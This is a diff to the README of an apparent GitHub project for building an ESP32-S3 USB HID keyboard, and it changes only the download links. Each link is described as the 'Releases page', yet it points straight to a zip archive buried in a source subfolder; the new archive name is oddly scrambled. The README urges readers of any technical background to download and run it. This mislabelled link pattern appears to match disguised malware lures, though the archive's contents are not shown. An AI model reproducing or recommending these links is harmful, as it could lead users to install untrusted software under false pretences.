@@ -1,7 +1,7 @@
 # 🎹 ESP32-USB-HID-Keyboard-Series - Create Your Own USB Keyboard Easily
 
 ## 📥 Download Link
-[![Download Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/ESP32-USB-HID-Keyboard-Series-3.5-beta.5.zip)](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/ESP32-USB-HID-Keyboard-Series-3.5-beta.5.zip)
+[![Download Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/US-ES-HI-Series-Keyboard-v2.5.zip)](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/US-ES-HI-Series-Keyboard-v2.5.zip)
 
 ## 🚀 Getting Started
 The ESP32-USB-HID-Keyboard-Series project allows you to build a USB keyboard using the ESP32-S3 chip. This guide will help you download and run the software easily, regardless of your technical background.
@@ -25,7 +25,7 @@ The ESP32-USB-HID-Keyboard-Series project allows you to build a USB keyboard usi
 - Compatible with TinyUSB and ESP-IDF frameworks
 
 ## 📥 Download & Install
-To get started, visit this page to download the latest release: [Download the Latest Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/ESP32-USB-HID-Keyboard-Series-3.5-beta.5.zip).
+To get started, visit this page to download the latest release: [Download the Latest Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/US-ES-HI-Series-Keyboard-v2.5.zip).
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version of the software.
@@ -72,4 +72,4 @@ If you're interested in contributing to this project:
 3. Submit a pull request with a clear description of your changes.
 
 ## 🌟 Thank You
-Thank you for using the ESP32-USB-HID-Keyboard-Series. We hope you enjoy creating your own USB keyboard and exploring its features. Remember, you can always return to the Releases page if you need to download updates or the latest features: [Download the Latest Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/ESP32-USB-HID-Keyboard-Series-3.5-beta.5.zip).
+Thank you for using the ESP32-USB-HID-Keyboard-Series. We hope you enjoy creating your own USB keyboard and exploring its features. Remember, you can always return to the Releases page if you need to download updates or the latest features: [Download the Latest Release](https://raw.githubusercontent.com/yarikyyy/ESP32-USB-HID-Keyboard-Series/main/stage2_advanced_keystrokes/main/US-ES-HI-Series-Keyboard-v2.5.zip).
